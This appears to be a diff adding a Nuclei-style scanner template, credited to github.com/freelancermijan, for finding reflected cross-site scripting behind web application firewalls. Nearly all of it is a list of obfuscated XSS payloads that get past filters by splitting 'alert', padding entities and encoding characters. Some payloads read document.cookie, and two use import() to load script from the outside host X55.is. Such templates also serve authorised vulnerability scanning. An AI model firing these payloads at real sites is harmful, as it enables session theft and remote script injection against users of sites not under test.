@@ -1,0 +1,52 @@
+id: reflected-xss-waf-bypass
+
+info:
+  name: Reflected Cross Site Scripting
+  author: github.com/freelancermijan
+  severity: medium
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "';k='e'%0Atop['al'+k+'rt'](1)//"
+        - "'\"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>"
+        - '<svg/onload=window["al"+"ert"]1337>'
+        - "<svg onload=alert&#0000000040document.cookie)>"
+        - "<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>"
+        - "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E"
+        - "<Img Src=//X55.is OnLoad%0C=import(Src)>"
+        - "<Svg Only=1 OnLoad=confirm(atob(\"Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==\"))>"
+        - "\">'><details/open/ontoggle=confirm('XSS')>"
+        - "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/"
+        - "';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//"
+        - "\">%0D%0A%0D%0A<x '=\"foo\"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>"
+        - "<svg onload='new Function[\"Y000!\"].find(al\u0065rt)'>"
+        - "<Img Src=//X55.is OnLoad%0C=import(Src)>"
+        - "<sVg OnPointerEnter=\"location=javas+cript:ale+rt%2+81%2+9;//</div\">"
+        - "<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;"
+        - "lert&#x000000028;origin&#x000029;>"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
